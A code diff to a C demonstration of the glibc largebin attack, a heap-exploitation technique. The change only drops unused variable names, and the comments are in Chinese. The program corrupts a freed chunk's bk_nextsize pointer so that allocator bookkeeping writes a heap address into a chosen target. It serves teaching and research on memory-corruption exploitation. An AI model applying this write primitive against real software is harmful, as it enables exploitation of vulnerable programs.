@@ -43,16 +43,16 @@ int main(){
   // p1 比 p2 大 0x10；guard 防止两个 large chunk 在释放时相互合并。
   size_t *p1 = malloc(0x428);
 
-  size_t *g1 = malloc(0x18);
+  malloc(0x18);
 
   size_t *p2 = malloc(0x418);
 
-  size_t *g2 = malloc(0x18);
+  malloc(0x18);
 
   free(p1);
 
   // 申请更大的块，迫使 p1 从 unsorted bin 转入 largebin。
-  size_t *g3 = malloc(0x438);
+  malloc(0x438);
 
   // p2 留在 unsorted bin，稍后插入已有 p1 的 largebin。
   free(p2);
@@ -62,7 +62,7 @@ int main(){
   p1[3] = (size_t)((&target)-4);
 
   // 再次扫描 unsorted bin，触发 p2 的 largebin 插入和目标写入。
-  size_t *g4 = malloc(0x438);
+  malloc(0x438);
 
   // 目标必须精确等于 p2 的 chunk 头；仅非零不足以证明写入值正确。
   assert((size_t)(p2-2) == target);
